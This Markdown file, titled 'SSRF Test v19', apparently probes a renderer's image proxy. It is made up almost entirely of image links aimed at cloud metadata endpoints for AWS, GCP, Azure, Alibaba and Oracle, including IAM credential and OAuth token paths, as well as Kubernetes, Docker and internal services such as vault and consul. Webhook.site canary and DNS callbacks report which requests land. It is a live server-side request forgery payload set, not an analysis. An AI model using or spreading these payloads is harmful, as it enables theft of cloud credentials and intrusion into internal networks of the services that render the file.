# SSRF Test v19 - Cloud Metadata Deep Dive

Testing comprehensive cloud metadata access attempts.

## Canary
![](https://webhook.site/b57db43a-e661-4f0b-9eb4-1028a21a7407/v19-canary.gif)

## 1. AWS Metadata (IMDSv1)

### Standard endpoints
![aws1](http://169.254.169.254/latest/meta-data/)
![aws2](http://169.254.169.254/latest/user-data)
![aws3](http://169.254.169.254/latest/dynamic/instance-identity/document)

### IAM credentials
![aws4](http://169.254.169.254/latest/meta-data/iam/security-credentials/)
![aws5](http://169.254.169.254/latest/meta-data/iam/info)

### Instance identity  
![aws6](http://169.254.169.254/latest/meta-data/instance-id)
![aws7](http://169.254.169.254/latest/meta-data/hostname)
![aws8](http://169.254.169.254/latest/meta-data/local-ipv4)

## 2. GCP Metadata

### Standard  
![gcp1](http://metadata.google.internal/computeMetadata/v1/)
![gcp2](http://169.254.169.254/computeMetadata/v1/)
![gcp3](http://metadata/computeMetadata/v1/)

### Service Account
![gcp4](http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token)
![gcp5](http://169.254.169.254/computeMetadata/v1/instance/service-accounts/)

### Project Info
![gcp6](http://metadata.google.internal/computeMetadata/v1/project/project-id)
![gcp7](http://metadata.google.internal/computeMetadata/v1/project/attributes/)

## 3. Azure Metadata (IMDS)

### Instance metadata
![az1](http://169.254.169.254/metadata/instance?api-version=2021-02-01)
![az2](http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/)

### Wireserver (legacy)
![az3](http://168.63.129.16/machine?comp=goalstate)

## 4. DigitalOcean

![do1](http://169.254.169.254/metadata/v1.json)
![do2](http://169.254.169.254/metadata/v1/id)
![do3](http://169.254.169.254/metadata/v1/region)

## 5. Alibaba Cloud

![ali1](http://100.100.100.200/latest/meta-data/)
![ali2](http://100.100.100.200/latest/meta-data/ram/security-credentials/)

## 6. Oracle Cloud

![oci1](http://169.254.169.254/opc/v1/instance/)
![oci2](http://169.254.169.254/opc/v2/instance/)

## 7. Kubernetes

### Service account tokens
![k8s1](http://kubernetes.default.svc/)
![k8s2](http://kubernetes.default.svc.cluster.local/)
![k8s3](http://10.0.0.1/)

### API Server  
![k8s4](http://kubernetes/api/v1/)
![k8s5](http://kubernetes.default/api/v1/namespaces)

## 8. Docker/Container Endpoints

### Docker socket
![dock1](http://172.17.0.1:2375/version)
![dock2](http://host.docker.internal/)

### Unix socket via redirect (if supported)
![dock3](http://webhook.site/b57db43a-e661-4f0b-9eb4-1028a21a7407/docker-test.gif)

## 9. Cloud-Init / EC2 Userdata

### Cloud config
![cloud1](http://169.254.169.254/latest/user-data)
![cloud2](http://169.254.169.254/2009-04-04/user-data)

## 10. DNS Verification

![dns1](http://b57db43a-e661-4f0b-9eb4-1028a21a7407.dnshook.site/v19-dns.gif)
![dns2](http://cloud-meta.b57db43a-e661-4f0b-9eb4-1028a21a7407.dnshook.site/cloud.gif)

## 11. Alternative Link-Local

### IPv4 link local variations
![ll1](http://169.254.0.1/)
![ll2](http://169.254.1.1/)
![ll3](http://169.254.254.254/)

## 12. Internal Service Discovery

### Common internal hostnames
![int1](http://consul/v1/agent/members)
![int2](http://consul.service.consul/)
![int3](http://vault/v1/sys/health)
![int4](http://etcd/version)
![int5](http://redis/)
![int6](http://elasticsearch/)
![int7](http://rabbitmq/)
![int8](http://zookeeper/)

## 13. External Validation

### Confirm Camo still reaches external
![ext1](http://webhook.site/b57db43a-e661-4f0b-9eb4-1028a21a7407/external-ok.gif)
![ext2](https://webhook.site/b57db43a-e661-4f0b-9eb4-1028a21a7407/external-https.gif)

Version 19 - Cloud Metadata Deep Dive